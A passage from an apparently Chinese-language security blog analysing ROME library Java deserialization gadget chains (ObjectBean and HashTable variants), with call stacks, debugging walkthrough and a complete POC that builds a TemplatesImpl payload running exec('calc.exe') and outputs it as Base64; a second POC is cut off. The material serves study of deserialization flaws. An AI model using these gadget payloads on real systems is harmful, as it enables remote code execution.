<h2 id="0x02-EqualsBean"><a href="#0x02-EqualsBean" class="headerlink" title="0x02 EqualsBean"></a>0x02 EqualsBean</h2><p>他也能作为一段 ROME 链的最终触发点，也就是调用 get 方法<br>触发点在它的beanEquals 方法中，整体逻辑和 toStringBean 的 tosting 差不多，都是获取到 get 方法之后通过 invoke 调用，但由于他是 equals 方法的缘故，要两者进行比较，所以会两次调用 get 方法，来判断两者是否相等，这一点在我们之后分析它的攻击链时会用到<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711887018145-0ca29033-6849-4ae2-b5bb-269e2037a930.png?x-oss-process=image/format,webp/resize,w_1406,limit_0#averageHue=%232b2e33&from=url&id=rANCe&originHeight=455&originWidth=1406&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=" referrerpolicy="no-referrer"></p>
<h1 id="ROME-链流程分析"><a href="#ROME-链流程分析" class="headerlink" title="ROME 链流程分析"></a>ROME 链流程分析</h1><h2 id="0x01-ObjectBean利用链"><a href="#0x01-ObjectBean利用链" class="headerlink" title="0x01 ObjectBean利用链"></a>0x01 ObjectBean利用链</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span>
<span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>
<span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                  
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">beanHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>
<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后就是 fastjson 中最常见的通过getOutputProperties 链去加载字节码了<br>POC 如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token comment">//javassist写恶意字节码</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span>
        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//配置ToStringBean中的_beanClass，指定要toString出的类</span>
        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"_cloneableBean"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"_toStringBean"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token function">unSerial</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 输出序列化的Base64编码字符</span>
        <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ByteArrayOutputStream</span> <span class="token function">unSerial</span><span class="token punctuation">(</span><span class="token class-name">Map</span> hashMap<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bs<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> bs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="1x01-流程分析"><a href="#1x01-流程分析" class="headerlink" title="1x01 流程分析"></a>1x01 流程分析</h3><p>初步的断点打在 readObject 方法处<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791727777-633bb731-b27f-45cd-af08-5363bbc18912.png#averageHue=%232e3136&clientId=ufc9b3df2-ec82-4&from=paste&height=192&id=ubd80734a&originHeight=360&originWidth=1610&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=204041&status=done&style=none&taskId=u014d7ea5-67ab-4efa-ad9c-81d52033e86&title=&width=858.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>然后我们跟进其 readObject，很熟悉的流程，就不多做赘述了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791777034-cf6027ed-83d3-45bd-8b59-c3b360ad21d1.png#averageHue=%232e3643&clientId=ufc9b3df2-ec82-4&from=paste&height=125&id=u95b122df&originHeight=235&originWidth=1941&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=137148&status=done&style=none&taskId=ue3fe5b56-0abb-4b83-8b94-fec127dbba3&title=&width=1035.2" referrerpolicy="no-referrer" alt="image.png"><br>后续直接跟进到 ObjectBean 的 hashCode<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791826291-da1ebd00-2f44-4c53-aa82-b8c890e0c52c.png#averageHue=%232b333f&clientId=ufc9b3df2-ec82-4&from=paste&height=161&id=u85f01e41&originHeight=302&originWidth=1503&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=139925&status=done&style=none&taskId=ud8e54ae2-3fcf-4c4e-8f89-7cd5d260307&title=&width=801.6" referrerpolicy="no-referrer" alt="image.png"><br>这里会调用到 equalsBean 的 beanHashCode()，继续跟进<br>由于刚才我们赋值的时候给 _obj 赋值上了构造好的 toStringBean，这里直接调 toStringBean 的无参 toString<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791931702-6cedc7d5-000d-4bff-99f1-05957aa7578b.png#averageHue=%23353c45&clientId=ufc9b3df2-ec82-4&from=paste&height=297&id=u297d8ccb&originHeight=556&originWidth=2014&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=367320&status=done&style=none&taskId=ue7c90d87-4aed-4aeb-9bfd-4998c93d156&title=&width=1074.1333333333334" referrerpolicy="no-referrer" alt="image.png"><br>这里直接一路跟到有参 toString 就行，先是通过 getPropertyDescriptors 方法获取到关于 TemplatesImpl 的包装类，然后通过包装类 pds 的 getReadMethod 方法获取所有的 get 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792043116-f5010aff-79e0-4ded-8ee7-f1766114f870.png#averageHue=%2331363c&clientId=ufc9b3df2-ec82-4&from=paste&height=583&id=ubde17ded&originHeight=1094&originWidth=2049&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=822782&status=done&style=none&taskId=ucece8013-f250-4464-b1d7-4e48ae3202a&title=&width=1092.8" referrerpolicy="no-referrer" alt="image.png"><br>这里第一个就是获取 getOutputProperties 方法<br>返回之后开始调用，直接跟进 invoke<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792290065-00b78ce1-20e2-47b2-aefe-cf57d6201b47.png#averageHue=%232c3037&clientId=ufc9b3df2-ec82-4&from=paste&height=323&id=ua4ec5968&originHeight=606&originWidth=1462&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=334103&status=done&style=none&taskId=u30e897d5-9c0f-4ee6-94c3-15139e690cf&title=&width=779.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>跟进到 TemplateImpl 的getOutputProperties 方法，这里会调用 newTransformer()方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792322356-669021ca-be3b-42d5-82a7-494f49288521.png#averageHue=%232d333d&clientId=ufc9b3df2-ec82-4&from=paste&height=220&id=u531850fb&originHeight=412&originWidth=1260&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=174881&status=done&style=none&taskId=u88745025-7de9-40b3-a0f5-8fd0a6792b2&title=&width=672" referrerpolicy="no-referrer" alt="image.png"><br>后续就是 newTransformer-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;loader.defineClass 加载恶意类的流程，不过多赘述<br>其实 ObjectBean 这条链子还是好分析，毕竟大部分内容都是我们之前学过的，只有中间 toStringBean 方法会调用类中 get 方法的特性是第一次接触</p>
<h2 id="0x02-HashTable利用链"><a href="#0x02-HashTable利用链" class="headerlink" title="0x02 HashTable利用链"></a>0x02 HashTable利用链</h2><p>针对 HashMap 被 ban 的情况，其实就是 CC7 和 CC6 的区别、<br>在 HashTable 的 readObject 方法中，他会对 HashTable 中的每一个元素都调用 reconstitutionPut 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792883532-ffc7ff36-e2bb-4adb-b440-76b25953d0c8.png#averageHue=%232c2f33&clientId=ufc9b3df2-ec82-4&from=paste&height=261&id=u431d5baa&originHeight=490&originWidth=1274&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=157493&status=done&style=none&taskId=udcf767d8-bc84-4734-ac44-bbdc5ac038e&title=&width=679.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br>之前这里还存在一个 hash 碰撞的问题，只不过具体的要进入 for 循环调用 equals 方法，我们这里需要调用到 hashcode 方法就行，没必要考虑这个问题<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792994986-c5a3c203-22a5-41c4-bd55-4b3ce8e4ba5b.png#averageHue=%232c2f34&clientId=ufc9b3df2-ec82-4&from=paste&height=362&id=uc34cdd69&originHeight=679&originWidth=1281&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=283706&status=done&style=none&taskId=udcba4b15-ca82-491f-9db0-68bb3cdaf03&title=&width=683.2" referrerpolicy="no-referrer" alt="image.png"><br>后面 hashcode 就是接ObjectBean利用链后段了<br>调用栈如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashTable</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span>
<span class="token class-name">HashTable</span><span class="token punctuation">.</span><span class="token function">reconstitutionPut</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              
<span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                  
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">beanHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>
<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>POC 如下：<br>把 hashmap 换成 hashtable 就行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HashTablePOC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token comment">//javassist写恶意字节码</span>
